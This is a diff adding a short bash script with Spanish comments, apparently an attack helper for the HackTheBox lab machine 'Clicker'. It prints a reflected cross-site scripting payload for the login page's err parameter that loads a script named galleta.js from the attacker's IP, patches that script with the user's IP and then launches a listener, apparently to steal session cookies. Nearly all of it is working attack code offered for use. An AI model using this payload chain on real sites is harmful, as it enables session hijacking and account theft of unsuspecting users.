@@ -1,0 +1,23 @@
+#!/bin/bash
+
+
+echo ""
+echo " ejecutar en el navegador despues de login.php:"
+echo "?err=%3Cscript%20src=%22http://10.10.14.3/galleta.js%22%3E%3C/script%3E"
+echo ""
+echo "por ejemplo http://clicker.htb/login.php?err=%3Cscript%20src=%22http://10.10.14.3/galleta.js%22%3E%3C/script%3E"
+
+echo ""
+
+
+# Copiar galleta.js desde /usr/bin al directorio actual
+cp /usr/bin/galleta.js .
+
+# Solicitar la IP al usuario
+read -p "Por favor, ingresa tu dirección IP: " nueva_ip
+
+# Reemplazar la IP local en galleta.js con la nueva IP
+sed -i "s/IPLOCAL/$nueva_ip/g" galleta.js
+
+# Ejecutar el comando galleta
+galletapython
